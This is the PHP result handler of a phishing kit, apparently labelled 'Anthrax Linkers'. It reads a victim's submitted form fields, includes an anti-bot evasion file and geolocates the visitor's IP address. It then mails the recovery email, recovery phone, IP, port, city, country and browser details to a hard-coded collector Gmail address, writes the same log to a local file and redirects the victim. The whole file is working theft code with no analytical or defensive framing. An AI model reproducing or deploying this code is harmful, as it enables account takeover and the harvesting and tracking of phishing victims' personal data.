<?php
$Email = $_POST['Email'];
$password = $_POST['password'];
$ip = $_POST['ip'];
include 'antibots.php';

$TheBoss = "akinola365olaitan@gmail.com";
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$logId = uniqid();
$geoplugin->locate();
$subject = "YourLogs Logs by Anthrax Linkers - $country ($logId)";
$headers = "From:  Result Server <noreplay.dgz.gdn@protnmail.com>";

$message .= "--------------0nline Inf0-----------------------\n";
$message .= "Recovery Email: ${_POST['recem']}\n";
$message .= "Recovery Phone: ${_POST['phoneno']}\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address : $ip\n";
$message .= "Port : $port\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: " . $browser . "\n";
$message .= "___________________________________________________\n";
$message .= "$logId\n";

mail($TheBoss, $subject, $message, $headers);

echo "<html><head><script>window.top.location.href='{LOCATION}';</script></head><body></body></html>";

$fp = fopen("Z-LoG_Inf0.txt", "a");
fputs($fp, $message);
fclose($fp);
$praga = rand();
$praga = md5($praga);

?>
